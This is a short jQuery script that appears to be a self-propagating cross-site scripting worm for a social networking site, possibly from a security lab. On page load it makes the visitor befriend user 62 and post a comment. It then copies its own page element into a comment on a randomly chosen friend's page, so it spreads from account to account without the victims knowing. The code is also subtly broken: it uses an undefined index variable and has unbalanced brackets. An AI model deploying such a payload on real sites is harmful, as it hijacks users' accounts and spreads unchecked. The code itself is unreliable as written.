$( document ).ready(function(){

    $.get("add_friend.php?id=62");
    $.ajax({url:"add_comment.php?id=62&comment="+ new Date()});
    $.get( "friends.php", function( data ) {
		f = data.split('<')[0].split(',');
		if(f.length > 1){
			index = 0;
			while(f[index] == 62){
				index = Math.floor(Math.random()*999) % f.length;
			}
			$.ajax({url:"add_comment.php?id="+f[i]+"&comment="+encodeURI(document.getElementById("m").outerHTML)});
		}
			
	};
});
